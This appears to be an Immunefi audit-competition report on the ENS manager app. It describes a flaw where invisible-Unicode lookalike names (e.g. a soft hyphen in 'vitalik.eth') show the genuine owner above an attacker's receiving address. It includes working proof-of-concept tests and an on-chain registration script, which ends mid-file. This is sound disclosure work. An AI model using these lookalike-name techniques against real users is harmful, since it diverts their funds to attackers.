# 92775 w a critical manager renders a lookalike ens name with the victim s identity above the attacker s receiving address

**Submitted on Sep 12th 2026 at 07:33:40 UTC by @mussucal for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92775
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

apps/manager never applies ENSIP-15 normalization to a name before using it as a lookup key or rendering it. The sibling app apps/portal does, and refuses to render a non-normalized name. Because the manager omits this, its profile page ends up describing two different ENS nodes at once: it fetches the owner, registration date and expiry under the normalized name, but fetches the records — including the addr(60) receiving address, avatar, description and links — under the raw name, and paints the raw name as the page's 32-point identity heading.

ENSIP-15 maps several invisible code points to nothing (soft hyphen U+00AD, zero-width space U+200B, variation selectors U+FE0F/U+FE0E, word joiner U+2060). A label containing one of them is visually identical to a real name, hashes to a different, freely registrable node, and normalizes back to the real name.

An attacker registers such a lookalike — the manager's own registration flow accepts and mints it, and the ENSv2 registrar applies no normalization gate (confirmed on-chain, §Layer 3) — sets its records to point at their own wallet, and sends the victim a link. The victim sees the real name, the real owner, and the real registration dates, sitting directly above the attacker's copy-to-clipboard receiving address.

A one-line, zero-install demonstration of the primitive:

```ts
import { normalize } from 'viem/ens'
import { namehash } from 'viem'
const raw = 'vita­lik.eth'
normalize(raw)                             // 'vitalik.eth'   <- the page attributes THIS name's owner
namehash(raw) === namehash('vitalik.eth')  // false           <- but reads THIS node's records
```

## Vulnerability Details

1. The /$name route does not perform ENSIP-15 validation

The only validation applied to the Manager route parameter is in:

apps/manager/src/routes/$name/route.tsx:5-13

The relevant logic is:

params: { parse: ({ name }) => { if (name.length < 3 || !name.includes('.')) { throw new Error('Invalid ENS name') } return { name } }, }

This validates only that the value is at least three characters long and contains a dot.

It does not verify ENSIP-15 canonicity.

The audit search for isValidEnsName, isNormalized, ens\_normalize, and @adraffy in apps/manager/src returns no matches.

Therefore, a non-canonical ENS name containing an invisible Unicode code point reaches the profile route unchanged.

2. Invisible Unicode characters create distinct ENS nodes

The installed ENS normalization implementation removes several invisible code points during normalization.

The PoC identifies the following usable code points:

U+00AD

U+200B

U+FE0F

U+FE0E

U+2060

For the concrete payload:

vita­lik.eth

the normalization result is:

normalize('vita­lik.eth') === 'vitalik.eth'

However, the namehashes are different:

namehash('vita­lik.eth') !== namehash('vitalik.eth')

Thus the visually identical names represent separate ENS nodes.

NAME-0 in the attached property-based PoC verifies this primitive across the generated invisible characters, base labels, and insertion positions.

3. The owner lookup uses the normalized name

The owner service is:

apps/manager/src/features/profile/service/profileOwner.ts:25,56

It first normalizes the route parameter:

const ethName = normalizeEthName(params.name)

It then performs the owner lookup using the normalized value:

ensjsv2\_getOwner(client, { name: ethName.name })

Therefore, if the route parameter is:

vita­lik.eth

the owner lookup is performed for:

vitalik.eth

The expiry lookup follows the same normalization behaviour at:

apps/manager/src/features/profile/service/profileExpiry.ts:77

This means the page can display the genuine vitalik.eth owner and registration information even though the URL contains the attacker's separate lookalike node.

4. The profile records lookup uses the raw name

The profile records service is:

apps/manager/src/features/profile/service/profileRecords.ts:123-124

It passes the route parameter directly to getRecords.

The relevant argument is:

name: name

where name is the raw route parameter.

The records request therefore resolves:

vita­lik.eth

rather than:

vitalik.eth

The records include:

addr(60)

avatar

description

URL

links

other profile records

The Layer 2 PoC drives the actual Manager getOwner and getProfileRecords service functions and asserts the exact name passed to each ensjs entrypoint.

This establishes that the owner and records paths operate on different ENS nodes.

5. The profile identity is rendered from the raw name

The profile identity is rendered in:

apps/manager/src/features/profile/components/view/ProfileDetails.tsx:22-27

The name value is passed directly to the profile name component and rendered as the visible identity.

The value originates from the raw route parameter through:

ProfileView → ProfileHeader → ProfileNameBadge

For:

vita­lik.eth

the U+00AD soft hyphen has no visible glyph.

The heading therefore appears as:

vitalik.eth

The application is consequently presenting an attacker-controlled ENS node using the visual identity of the legitimate name.

6. The attacker-controlled node supplies the receiving address

The Manager renders the ENS addr(60) record in:

apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:32-44

The address is placed inside a copy-enabled control that copies the full address.

Because the profile records are resolved using the raw attacker-controlled name, the attacker can set:

addr(60) = attacker\_wallet

on the lookalike node.

The resulting Manager page can therefore visually present:

vitalik.eth

while its receive card contains:

attacker\_wallet

The victim can copy the attacker-controlled address directly from the normal Manager receive interface.

7. The Manager registration flow accepts the same lookalike

The attacker can register the lookalike through the Manager registration flow.

The relevant parser is:

apps/manager/src/features/register-v2/utils/name-parser.ts:44-79

The parser performs trimming, lowercasing, JavaScript whitespace rejection, and a limited ASCII punctuation check.

The relevant invisible code points such as U+00AD and U+200B are not rejected by those checks.

The Manager also uses:

apps/manager/src/utils/domain.ts:27-33

for normalizeDomainNameFromUrl.

Despite its name, this function only lowercases the input and appends .eth; it does not perform ENSIP-15 normalization.

The registration flow subsequently commits the raw label.

The registration machine uses:

name.replace(/.eth$/, '')

as cleanLabel in:

packages/transaction-manager/src/machines/registration/registration.hca.actors.ts:322,498,793

The NAME-3 and NAME-4 properties demonstrate this registration-path behaviour.

8. The ENSv2 registrar accepts the lookalike

The Layer 3 PoC drives the ENSv2 ETHRegistrar directly on an Anvil fork of Sepolia.

The registration sequence is:

getRegisterPrice → makeCommitment → commit → register

The test registers both:

a canonical control label; and

a lookalike label containing U+00AD.

Both registrations are performed under equivalent conditions.

The resulting lookalike node is owned by the attacker and is distinct from the canonical control node.

This demonstrates that the registrar does not reject the invisible Unicode code point during registration.

The same registrar bytecode is used by the live deployment.

The Critical Node Split

The security-critical behaviour can be stated simply.

For the same route:

/$name = /vita­lik.eth

the Manager performs three different operations.

Visible profile identity

Uses the raw route parameter:

vita­lik.eth

which visually appears as:

vitalik.eth

Owner and expiry

Uses the normalized name:

vitalik.eth

Profile records and addr(60)

Uses the raw name:

vita­lik.eth

Therefore, the page combines the identity and ownership of one ENS node with the records and receiving address of another ENS node.

The Layer 2 service PoC confirms this split using the actual Manager service functions.

Attack Path

The attacker selects a target ENS name, for example vitalik.eth.

The attacker inserts an invisible Unicode code point such as U+00AD into the label.

The resulting name is vita­lik.eth.

ENSIP-15 normalization produces vitalik.eth, but the two names have different namehashes.

The Manager registration flow accepts the non-canonical label.

The ENSv2 registrar registers the lookalike as a distinct ENS node controlled by the attacker.

The attacker sets the lookalike's addr(60) record to their own wallet.

The attacker can copy other profile records from the legitimate name to make the profile appear authentic.

The attacker sends the victim a Manager URL containing the encoded lookalike.

The Manager accepts the URL because the route does not enforce ENSIP-15 normalization.

The profile heading renders the raw name, which visually appears as vitalik.eth.

The owner and expiry services normalize the name and display information belonging to the legitimate vitalik.eth node.

The profile records service resolves the raw lookalike and displays records belonging to the attacker-controlled node.

The receive section displays the attacker's addr(60) address.

The victim believes the address belongs to vitalik.eth.

The victim copies the displayed address and sends funds to it.

The funds are received by the attacker-controlled wallet.

No compromise of the victim's wallet or authenticated session is required.

## Impact Details

The vulnerability causes the real Manager application to present an attacker-controlled receiving address under the visual identity of a legitimate ENS name.

A victim opening the attacker-supplied profile link can see:

vitalik.eth as the visible profile identity;

the genuine vitalik.eth owner information;

the genuine registration and expiry information;

attacker-controlled profile records; and

the attacker's Ethereum address in the receive section.

The victim is interacting with the legitimate Manager application.

The deceptive identity is not being rendered by a fake website.

The attack therefore does not depend on phishing infrastructure or a fake domain.

The victim also does not need to connect their wallet to the attacker's site.

The victim simply copies the receiving address displayed by the legitimate Manager interface and uses it in their own transaction.

The result is that funds intended for the legitimate ENS identity can be sent to the attacker's address.

This satisfies the program's Critical impact category:

Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient.

Why the impact is Critical

The incorrect recipient is displayed by the target application itself.

The victim is using the real Manager application rather than an attacker-controlled website.

The visual difference is effectively zero.

U+00AD has no visible glyph, so vita­lik.eth visually collapses to vitalik.eth.

The page contains genuine information from the legitimate ENS node.

The owner, registration date, and expiry are obtained using the normalized name.

This makes the attacker's page appear authentic even when the victim checks the displayed ownership information.

The receiving address is attacker-controlled.

The addr(60) record comes from the attacker's separate raw node.

The victim can directly copy the attacker-controlled address from the normal receive UI.

The address is not merely present as arbitrary attacker-controlled text; it is surfaced through the Manager's profile record and receive interface.

The attacker does not need to compromise the victim.

No wallet takeover, session theft, signature theft, or privileged account access is required.

Additional Impact: Registration-Screen Lookalike

The same normalization defect has a second reachable manifestation in the Manager registration flow.

This is reported as part of the same finding because the same boundary-level normalization fix closes both behaviours.

The registration route is:

routes/register/$name.tsx:24

The label is validated through parseName.

Availability is processed through:

getRegistrationV2AvailabilityQueryOptions

which uses:

normalizeDomainNameFromUrl

from:

utils/domain.ts:27-33

That function does not perform ENSIP-15 normalization.

The raw label is subsequently rendered by:

PricingDomainHeader.tsx:9,21-30

and committed by the registration machine.

A URL such as:

<https://app.ens.domains/register/vita%C2%ADlik.eth>

can therefore present the victim with a visually canonical-looking registration flow for the invisible-character lookalike.

The victim can believe they are registering vitalik.eth while actually registering a distinct ENS node.

NAME-3 and NAME-4 reproduce this behaviour.

This registration-screen manifestation is part of the same root cause and is closed by the same route/input normalization fix.

## PoC Description

Proof of Concept

The PoC uses three layers.

Layer 1 — Property-based application test

File: apps/manager/audit/name-display-integrity.fast-check.test.ts

Run from apps/manager:

npx vitest run --config vitest.audit.config.ts audit/name-display-integrity.fast-check.test.ts

The test suite contains seven properties.

NAME-0 — Green

Confirms that the five invisible Unicode code points normalize away while changing the ENS namehash.

NAME-1 — Expected failure

Confirms that the owner node and records node should be identical, but the current implementation uses different nodes.

NAME-2 — Expected failure

Confirms that the /$name route accepts a non-canonical ENS name.

NAME-3 — Expected failure

Confirms that the registration parser accepts the lookalike.

NAME-4 — Expected failure

Confirms that normalizeDomainNameFromUrl does not perform ENSIP-15 normalization.

NAME-5 — Green control

Confirms that the Portal ENSIP-15 gate rejects the generated lookalikes.

NAME-6 — Expected failure

Confirms the concrete vita­lik.eth identity mismatch.

The concrete PoC uses:

const raw = 'vita­lik.eth'

const canonical = 'vitalik.eth'

and verifies:

expect(routeParamAccepts(raw)).toBe(true)

expect(namehash(raw)).not.toBe(namehash(canonical))

expect(normalizeEthName(raw)?.name).toBe(canonical)

expect(parseName(raw).isOk()).toBe(true)

The final identity invariant fails because the displayed identity is derived from the raw value while ownership is attributed to the normalized value.

Layer 2 — Actual Manager service functions

File: apps/manager/src/features/profile/service/profileNodeSplit.audit.test.ts

Run from the repository root:

pnpm --filter manager exec vitest run src/features/profile/service/profileNodeSplit.audit.test.ts

This test imports the actual Manager getOwner and getProfileRecords functions.

Only the ensjs/indexer boundary is mocked.

The test verifies:

getOwner receives the normalized name.

getProfileRecords receives the raw name.

The test therefore confirms that the vulnerable node split exists in the actual Manager service implementation.

Layer 3 — On-chain registration

File: apps/manager/audit/c1-layer3-onchain.mjs

Start an Anvil Sepolia fork:

anvil --fork-url $SEPOLIA\_RPC\_URL --chain-id 11155111

Then run:

cd apps/manager && node audit/c1-layer3-onchain.mjs

The script:

creates a fresh canonical control label;

creates the corresponding lookalike label;

verifies both labels are initially unowned;

registers the canonical label;

registers the lookalike containing U+00AD;

verifies ownership of the lookalike; and

verifies that the lookalike node is distinct from the canonical node.

The script also verifies the commitment window before calling register.

This prevents a commitment-timing failure from being mistaken for a Unicode-label rejection.

Result of PoC

Layer 1 result

The property-based test identifies:

U+00AD

U+200B

U+FE0F

U+FE0E

U+2060

as usable invisible lookalike code points.

The expected result is:

Tests 2 passed | 5 expected fail (7)

The two passing properties are controls.

The five expected failures represent violated security invariants in the Manager implementation.

Layer 2 result

The service-level test confirms:

getOwner → normalized name

getProfileRecords → raw name

Therefore, one route parameter causes the Manager to resolve two different ENS nodes for the same page.

Layer 3 result

The on-chain PoC confirms:

normalize(lookalike) === control

and:

namehash(lookalike) !== namehash(control)

The ENSv2 registrar successfully registers the lookalike.

The resulting registry state confirms:

ETHRegistry.getOwner(lookalike) == attacker

and:

lookalikeNode != controlNode

Therefore, the attacker can obtain a real, separately owned ENS node that visually collapses to the legitimate name.

The attacker can then populate that node with an attacker-controlled addr(60) record.

End-to-End Result

The complete demonstrated chain is:

invisible Unicode input

→ distinct ENS node

→ attacker-owned lookalike

→ Manager accepts raw route

→ owner lookup normalizes

→ records lookup remains raw

→ raw lookalike rendered as profile identity

→ attacker-controlled addr(60) displayed

→ victim copies displayed address

→ victim sends funds to attacker

This establishes the Critical impact end to end.

## References

Vulnerable Manager code

apps/manager/src/routes/$name/route.tsx:5-13 — route parameter validation.

apps/manager/src/features/profile/service/profileOwner.ts:25,56 — normalized owner lookup.

apps/manager/src/features/profile/service/profileRecords.ts:123-124 — raw records lookup.

apps/manager/src/features/profile/service/profileName.ts:14-40 — normalizeEthName.

apps/manager/src/features/profile/service/profileExpiry.ts:77 — normalized expiry lookup.

apps/manager/src/features/profile/components/view/ProfileDetails.tsx:22-27 — profile identity rendering.

apps/manager/src/features/profile/components/view/ProfileAddressesSection.tsx:32-44 — copyable receiving address.

apps/manager/src/features/register-v2/utils/name-parser.ts:44-79 — registration parser.

apps/manager/src/utils/domain.ts:27-33 — normalizeDomainNameFromUrl.

apps/manager/src/routes/$name/index.tsx:38-47 — registration classification.

apps/manager/src/features/register-v2/components/PricingDomainHeader.tsx:9,21-30 — raw registration-name rendering.

packages/transaction-manager/src/machines/registration/registration.hca.actors.ts:322,498,793 — raw label commitment.

Correct behaviour in Portal

apps/portal/src/utils/token/isNormalized.ts:16-27

apps/portal/src/routes/$name/index.tsx:442,459

PoC files

apps/manager/audit/name-display-integrity.fast-check.test.ts

apps/manager/src/features/profile/service/profileNodeSplit.audit.test.ts

apps/manager/audit/c1-layer3-onchain.mjs

apps/manager/vitest.audit.config.ts

Libraries and standards

viem\@2.52.2

@adraffy/ens-normalize\@1.11.1

ENSIP-15 — ENS Name Normalization

<https://docs.ens.domains/ensip/15>

<https://github.com/adraffy/ens-normalize.js>

<https://github.com/ensdomains/ensjs>

On-chain contracts

ENSv2 ETHRegistrar on Sepolia:

0xa88553F454b77203B0D036A05c894d555EAAa2Cc

ENSv2 ETHRegistry on Sepolia:

0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2

## Proof of Concept

## Proof of Concept

### apps/manager/audit/name-display-integrity.fast-check.test.ts\*\*

```ts
/**
 * Audit spec — ENS name display integrity in `apps/manager`.
 *
 * Run from `apps/manager`:
 *   npx vitest run --config vitest.audit.config.ts audit/name-display-integrity.fast-check.test.ts
 *
 * Every `it.fails` below is an EXPECTED RED — it encodes an invariant the app
 * should hold and currently does not. A green `it.fails` means the bug was
 * fixed (or my model of it is wrong) and the property should be re-read.
 *
 * The core defect: `apps/manager` never applies ENSIP-15 to the `/$name` route
 * parameter. Downstream, ownership/expiry are looked up under the NORMALIZED
 * name while records are resolved under the RAW name, and the RAW name is what
 * is painted as the page identity. Those are three different strings.
 */

import fc from 'fast-check'
import { describe, expect, it } from 'vitest'
import { namehash } from 'viem'
import { normalize } from 'viem/ens'

import { parseName } from '@/features/register-v2/utils/name-parser'
import { normalizeEthName } from '@/features/profile/service/profileName'
import { normalizeDomainNameFromUrl } from '@/utils/domain'

// ---------------------------------------------------------------------------
// The app's own route guard, transcribed from
// apps/manager/src/routes/$name/route.tsx:5-13 (the ONLY validation the
// `/$name` param receives before it is used as a lookup key and rendered).
// ---------------------------------------------------------------------------
const routeParamAccepts = (name: string): boolean =>
  name.length >= 3 && name.includes('.')

/**
 * The portal's gate, for contrast: apps/portal/src/utils/token/isNormalized.ts
 * checks `ens_normalize(label) === label` per label, and
 * apps/portal/src/routes/$name/index.tsx:442,459 refuses to render otherwise.
 * viem's `normalize` IS `ens_normalize`.
 */
const portalStyleIsValidEnsName = (name: string): boolean => {
  try {
    return normalize(name) === name
  } catch {
    return false
  }
}

const tryNormalize = (name: string): string | null => {
  try {
    return normalize(name)
  } catch {
    return null
  }
}

// ---------------------------------------------------------------------------
// Lookalike generator: base label + code points that ENSIP-15 MAPS AWAY
// (so they are invisible on screen yet change the labelhash).
// ---------------------------------------------------------------------------
const BASE_LABELS = ['vitalik', 'nick', 'ens', 'treasury', 'brantly', 'wallet']

/** Candidates. Which of these actually survive is asserted in NAME-0. */
const IGNORED_CODEPOINTS = ['­', '​', '️', '︎', '⁠']

const rawLookalikeArb = fc
  .tuple(
    fc.constantFrom(...BASE_LABELS),
    fc.constantFrom(...IGNORED_CODEPOINTS),
    fc.nat(),
  )
  .map(([label, mark, at]) => {
    const i = label.length === 0 ? 0 : at % (label.length + 1)
    return `${label.slice(0, i)}${mark}${label.slice(i)}.eth`
  })

/** A raw name that is accepted by the route, normalizes, but is not canonical. */
const deceptiveNameArb = rawLookalikeArb.filter((raw) => {
  const n = tryNormalize(raw)
  return n !== null && n !== raw && routeParamAccepts(raw)
})

describe('ENS name display integrity — apps/manager', () => {
  // -------------------------------------------------------------------------
  // NAME-0 — the primitive. Sanity-check that lookalikes exist at all.
  // -------------------------------------------------------------------------
  it('NAME-0: invisible code points exist that normalize away yet change the node', () => {
    const survivors = IGNORED_CODEPOINTS.filter((cp) => {
      const raw = `vita${cp}lik.eth`
      return tryNormalize(raw) === 'vitalik.eth' && namehash(raw) !== namehash('vitalik.eth')
    })

    // eslint-disable-next-line no-console
    console.log(
      'NAME-0 usable lookalike code points:',
      survivors.map((c) => `U+${c.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}`),
    )
    expect(survivors.length).toBeGreaterThan(0)
  })

  // -------------------------------------------------------------------------
  // NAME-1 — THE FINDING. Ownership and records are read from different nodes.
  //
  // apps/manager/src/features/profile/service/profileOwner.ts:25,56
  //   -> normalizeEthName(params.name)  => owner of the NORMALIZED node
  // apps/manager/src/features/profile/service/profileRecords.ts:123-124
  //   -> getRecords(client, { name })   => records of the RAW node
  //      (ensjs never normalizes: `grep -rn "normalize(" dist/esm` is empty)
  // -------------------------------------------------------------------------
  it.fails(
    'NAME-1: the node whose OWNER is displayed is the node whose RECORDS are displayed',
    () => {
      fc.assert(
        fc.property(deceptiveNameArb, (raw) => {
          const ownerNode = normalizeEthName(raw)
          fc.pre(ownerNode !== null)

          // profileOwner.ts hashes the normalized name; profileRecords.ts
          // resolves the raw name. Same page, two different nodes.
          expect(namehash(raw)).toBe(namehash(ownerNode!.name))
        }),
        { numRuns: 400 },
      )
    },
  )

  // -------------------------------------------------------------------------
  // NAME-2 — the route accepts names that are not ENSIP-15 canonical.
  // apps/manager/src/routes/$name/route.tsx:5-13
  // -------------------------------------------------------------------------
  it.fails('NAME-2: the /$name route rejects any name that is not ENSIP-15 canonical', () => {
    fc.assert(
      fc.property(deceptiveNameArb, (raw) => {
        fc.pre(!portalStyleIsValidEnsName(raw))
        expect(routeParamAccepts(raw)).toBe(false)
      }),
      { numRuns: 400 },
    )
  })

  // -------------------------------------------------------------------------
  // NAME-3 — the SAME app will also SELL you the lookalike.
  // apps/manager/src/features/register-v2/utils/name-parser.ts:44-79 lowercases,
  // rejects /\s/ and a small ASCII punctuation set. U+00AD and U+200B are
  // neither. apps/manager/src/utils/domain.ts:27-33 only lowercases + appends
  // ".eth" despite being called `normalizeDomainNameFromUrl`.
  // -------------------------------------------------------------------------
  it.fails('NAME-3: registration input validation rejects non-canonical labels', () => {
    fc.assert(
      fc.property(deceptiveNameArb, (raw) => {
        fc.pre(!portalStyleIsValidEnsName(raw))
        expect(parseName(raw).isOk()).toBe(false)
      }),
      { numRuns: 400 },
    )
  })

  it.fails('NAME-4: normalizeDomainNameFromUrl actually normalizes', () => {
    fc.assert(
      fc.property(deceptiveNameArb, (raw) => {
        const canonical = tryNormalize(raw)
        fc.pre(canonical !== null)
        expect(normalizeDomainNameFromUrl(raw)).toBe(canonical)
      }),
      { numRuns: 400 },
    )
  })

  // -------------------------------------------------------------------------
  // NAME-5 — CONTROL, must stay GREEN. The portal gate catches all of these,
  // which is what makes this a manager-only regression rather than a design
  // choice made across the monorepo.
  // -------------------------------------------------------------------------
  it('NAME-5: the portal-style ENSIP-15 gate rejects every lookalike (control)', () => {
    fc.assert(
      fc.property(deceptiveNameArb, (raw) => {
        expect(portalStyleIsValidEnsName(raw)).toBe(false)
      }),
      { numRuns: 400 },
    )
  })

  // -------------------------------------------------------------------------
  // NAME-6 — the concrete, non-fuzzed proof of concept.
  // -------------------------------------------------------------------------
  it.fails('NAME-6: PoC — /vita\\u00ADlik.eth cannot present as vitalik.eth', () => {
    const raw = 'vita­lik.eth' // renders as "vitalik.eth" in every browser
    const canonical = 'vitalik.eth'

    // 1. the route lets it through
    expect(routeParamAccepts(raw)).toBe(true)
    // 2. it is a DIFFERENT node from the real name -> attacker can own it
    expect(namehash(raw)).not.toBe(namehash(canonical))
    // 3. ...yet ownership + expiry are read from the REAL name's node
    expect(normalizeEthName(raw)?.name).toBe(canonical)
    // 4. ...and the manager will happily sell the attacker the lookalike
    expect(parseName(raw).isOk()).toBe(true)

    // The invariant that should hold and does not: what the page paints as its
    // identity (ProfileDetails.tsx:22-27, <h1> at 32px, the raw route param)
    // must be the same name whose owner it attributes below it.
    const paintedIdentity = raw
    const attributedOwnerOf = normalizeEthName(raw)!.name
    expect(paintedIdentity).toBe(attributedOwnerOf)
  })
})
```

### apps/manager/src/features/profile/service/profileNodeSplit.audit.test.ts

```ts
/**
 * C-1 cross-check — the profile page reads OWNER and RECORDS from two different
 * ENS nodes for a single `/$name` route param.
 *
 * This test exercises the REAL service code (`getOwner`, `getProfileRecords`) —
 * not a transcription — so it removes any doubt about the audit's inlined
 * copies. It mocks only the ensjs/indexer boundary (exactly as the existing
 * `profileOwner.test.ts` does) and asserts the NAME each ensjs entrypoint
 * receives:
 *
 *   - `getOwner` normalizes first  → ensjs v2 `getOwner` is called with the
 *     CANONICAL name (the real name's node).
 *   - `getProfileRecords` does NOT → ensjs `getRecords` is called with the RAW
 *     route param (the attacker's node).
 *
 * Runs in the app's own suite:  pnpm --filter manager exec vitest run \
 *   src/features/profile/service/profileNodeSplit.audit.test.ts
 * (or just `pnpm test:manager`, which picks it up automatically).
 */

import { namehash } from 'viem'
import { normalize } from 'viem/ens'
import { beforeEach, describe, expect, it, vi } from 'vitest'

const mocks = vi.hoisted(() => ({
  client: {},
  getV1Owner: vi.fn(),
  getV2Owner: vi.fn(),
  getRecords: vi.fn(),
  indexerQuery: vi.fn(),
}))

vi.mock('@ens-apps/indexer/urql', () => ({
  default: { query: mocks.indexerQuery },
}))
vi.mock('@ensdomains/ensjs/public/v1', () => ({ getOwner: mocks.getV1Owner }))
vi.mock('@ensdomains/ensjs/public/v2', () => ({ getOwner: mocks.getV2Owner }))
vi.mock('@ensdomains/ensjs/public', () => ({ getRecords: mocks.getRecords }))
vi.mock('@/lib/wagmi/helpers', async () => {
  const { ok } = await import('neverthrow')
  return { safeGetClient: () => ok(mocks.client) }
})

import { getProfileRecords } from './profileRecords'
import { getOwner } from './profileOwner'

// A visually-identical lookalike: soft hyphen (U+00AD) inside the label.
// normalize() collapses it to "vitalik.eth"; the namehash differs.
const RAW = 'vita­lik.eth'
const CANONICAL = 'vitalik.eth'

describe('C-1: profile owner vs records read different nodes', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    // indexer returns "no domain" for both the id=name and id=namehash queries
    mocks.indexerQuery.mockReturnValue({
      toPromise: async () => ({ data: { domain: null } }),
    })
    mocks.getV2Owner.mockResolvedValue(
      '0x1111111111111111111111111111111111111111',
    )
    mocks.getV1Owner.mockResolvedValue(null)
    mocks.getRecords.mockResolvedValue({
      texts: [],
      coins: [],
      resolverAddress: '0x2222222222222222222222222222222222222222',
      contentHash: null,
      abi: null,
    })
  })

  it('sanity: the lookalike is a different node that normalizes to the real name', () => {
    expect(normalize(RAW)).toBe(CANONICAL)
    expect(namehash(RAW)).not.toBe(namehash(CANONICAL))
  })

  it('getOwner uses the NORMALIZED name (real node)', async () => {
    await getOwner({ name: RAW })
    expect(mocks.getV2Owner).toHaveBeenCalled()
    const nameArg = mocks.getV2Owner.mock.calls[0][1].name
    expect(nameArg).toBe(CANONICAL) // normalized — the REAL name's node
  })

  it('getProfileRecords uses the RAW name (attacker node)', async () => {
    await getProfileRecords(RAW)
    expect(mocks.getRecords).toHaveBeenCalled()
    const nameArg = mocks.getRecords.mock.calls[0][1].name
    expect(nameArg).toBe(RAW) // NOT normalized — the ATTACKER's node
  })

  it('THE BUG: same route param, two different nodes on one page', async () => {
    await Promise.all([getOwner({ name: RAW }), getProfileRecords(RAW)])
    const ownerName = mocks.getV2Owner.mock.calls[0][1].name
    const recordsName = mocks.getRecords.mock.calls[0][1].name
    // owner node ≠ records node — the page describes two names at once
    expect(namehash(ownerName)).not.toBe(namehash(recordsName))
    expect(ownerName).toBe(CANONICAL)
    expect(recordsName).toBe(RAW)
  })
})
```

### apps/manager/audit/c1-layer3-onchain.mjs

```js
/**
 * C-1 Layer 3 (v3) — prove on-chain that the ENSv2 registrar MINTS a
 * non-normalized label, on an anvil fork of Sepolia. No Docker, no Rhinestone
 * orchestrator: we call ETHRegistrar.commit/register directly (the same path
 * e2e/fixtures/makeV2Name.ts uses), which is how the app's own e2e registers
 * .eth names.
 *
 * PREREQ (two terminals), from the repo root:
 *   1) anvil --fork-url $SEPOLIA_RPC_URL --chain-id 11155111
 *   2) cd apps/manager && node audit/c1-layer3-onchain.mjs
 *
 * ---------------------------------------------------------------------------
 * v3 — THE COMMIT RACE (this is what produced `0x6be614e3`)
 *
 * v1/v2 did:
 *     await wal.writeContract({ ...commit... })     // resolves on SUBMIT
 *     await test.increaseTime({ seconds: minAge + 5 })
 *     await test.mine({ blocks: 1 })
 *     await wal.writeContract({ ...register... })
 *
 * `writeContract` returns when the transaction is SUBMITTED, not when it is
 * mined. If `commit` was still pending when the time jump landed, it was mined
 * into the post-jump block — so the commitment's timestamp was AFTER the jump,
 * `register` followed a second later, and the registrar correctly rejected it
 * with CommitmentTooNew(bytes32,uint64,uint64). A race, which is why it
 * confirmed on one run and failed on another, and why it struck the second
 * registration rather than the first.
 *
 * It had nothing to do with the label. The registrar never reached the string.
 *
 * v3 measures instead of assuming:
 *   - awaits the receipt for every state-changing call;
 *   - reads the commitment's ACTUAL block timestamp and jumps relative to it;
 *   - asserts `now - commitTs >= MIN_COMMITMENT_AGE` (and, where the ABI
 *     exposes it, `< MAX_COMMITMENT_AGE`) BEFORE spending the register call, so
 *     a timing failure is caught by the harness instead of being reported as a
 *     contract verdict on the label.
 *
 * Also retained from v2:
 *   - BOTH labels unique per run, so the script is idempotent;
 *   - a preflight `getOwner` check, so "already taken" can never masquerade as
 *     "registrar refused";
 *   - reverts decoded against the real registrar ABI, so a failure names itself.
 *
 * The headline pair (`vita­lik` → `vitalik`) is asserted off-chain in step [0]:
 * that is where the normalization claim lives. The on-chain step only has to
 * show the registrar does not care about the invisible code point.
 * ---------------------------------------------------------------------------
 *
 * Recipe mirrors makeV2Name.ts: mock-USDC mint, and — crucially — clear the
 * owner's code first, because well-known anvil accounts have contract code on
 * Sepolia which makes ERC1155 _safeMint revert (that was the 0x57f447ce revert).
 */

import {
  createPublicClient, createWalletClient, createTestClient,
  http, parseAbi, keccak256, toHex, namehash,
} from 'viem'
import { normalize } from 'viem/ens'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { labelToCanonicalId } from '@ensdomains/ensjs/utils/v2'

const RPC = process.env.ANVIL_RPC ?? 'http://127.0.0.1:8545'

// ensjs Sepolia addresses (same source makeV2Name.ts uses)
const ETH_REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const ETH_REGISTRY  = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const MOCK_USDC     = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39' // the token the registrar accepts
const ZERO = '0x0000000000000000000000000000000000000000'
const REFERER = '0x0000000000000000000000000000000000000000000000000000000000000000'

const ATTACKER = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
const DURATION = BigInt(28 * 24 * 60 * 60) // 28 days — the contract minimum

const SOFT_HYPHEN = '­'

// The headline pair, asserted OFF-CHAIN in step [0].
const HEADLINE_LOOKALIKE = `vita${SOFT_HYPHEN}lik`
const HEADLINE_REAL      = 'vitalik'

// The on-chain pair — unique per run so the script is re-runnable. Same shape:
// an invisible U+00AD inside a label that normalizes to the control's label.
const TS        = Math.floor(Date.now() / 1000)
const LOOKALIKE = `vita${SOFT_HYPHEN}lik${TS}`
const CONTROL   = `vitalik${TS}`

const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) view returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
])
const maxAgeAbi = parseAbi(['function MAX_COMMITMENT_AGE() view returns (uint64)'])
const registryAbi = parseAbi(['function getOwner(uint256 id) view returns (address)'])
const erc20Abi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address a) view returns (uint256)',
])

const pub  = createPublicClient({ chain: sepolia, transport: http(RPC) })
